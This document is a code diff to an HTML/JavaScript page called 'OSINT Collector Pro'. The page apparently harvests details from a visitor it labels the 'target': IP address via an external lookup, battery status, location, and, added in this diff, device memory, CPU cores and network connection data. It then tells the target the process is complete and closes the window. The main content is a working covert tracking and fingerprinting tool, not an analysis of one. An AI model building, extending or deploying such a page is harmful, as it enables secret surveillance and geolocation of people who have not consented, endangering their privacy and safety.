@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OSINT Collector Premium</title>
+    <title>OSINT Collector Pro</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
@@ -787,10 +787,34 @@
                 ipAddress: null,
                 batteryLevel: null,
                 batteryStatus: null,
-                location: null
+                location: null,
+                connection: null,
+                deviceMemory: null,
+                hardwareConcurrency: null
             };
             
             try {
+                // Get additional device information
+                if ('deviceMemory' in navigator) {
+                    deviceInfo.deviceMemory = navigator.deviceMemory + ' GB';
+                }
+                
+                if ('hardwareConcurrency' in navigator) {
+                    deviceInfo.hardwareConcurrency = navigator.hardwareConcurrency + ' cores';
+                }
+                
+                if ('connection' in navigator) {
+                    const connection = navigator.connection;
+                    if (connection) {
+                        deviceInfo.connection = {
+                            type: connection.type,
+                            effectiveType: connection.effectiveType,
+                            downlink: connection.downlink + ' Mbps',
+                            rtt: connection.rtt + ' ms'
+                        };
+                    }
+                }
+                
                 // Create promises for all async operations
                 const ipPromise = fetch('https://api.ipify.org?format=json')
                     .then(response => response.json())
@@ -883,7 +907,12 @@
             
             // Close the window after a short delay
             setTimeout(() => {
-                window.close();
+                try {
+                    window.close();
+                } catch (e) {
+                    // If window.close() fails (some browsers block this)
+                    document.getElementById('targetMessage').textContent = "Complete! You may close this window.";
+                }
             }, 1500);
         }
         
@@ -1033,6 +1062,39 @@
                 </div>
             `;
             
+            // Add additional device info if available
+            if (device.deviceMemory) {
+                html += `
+                    <div class="detail-item">
+                        <div class="detail-label">Device Memory</div>
+                        <div class="detail-value">${device.deviceMemory}</div>
+                    </div>
+                `;
+            }
+            
+            if (device.hardwareConcurrency) {
+                html += `
+                    <div class="detail-item">
+                        <div class="detail-label">CPU Cores</div>
+                        <div class="detail-value">${device.hardwareConcurrency}</div>
+                    </div>
+                `;
+            }
+            
+            if (device.connection) {
+                html += `
+                    <div class="detail-item">
+                        <div class="detail-label">Network Connection</div>
+                        <div class="detail-value">
+                            Type: ${device.connection.type || 'Unknown'}<br>
+                            Effective Type: ${device.connection.effectiveType || 'Unknown'}<br>
+                            Downlink: ${device.connection.downlink || 'Unknown'}<br>
+                            RTT: ${device.connection.rtt || 'Unknown'}
+                        </div>
+                    </div>
+                `;
+            }
+            
             // Add location if available
             if (device.location) {
                 html += `
@@ -1097,4 +1159,4 @@
         }
     </script>
 </body>
-    </html>
+</html>
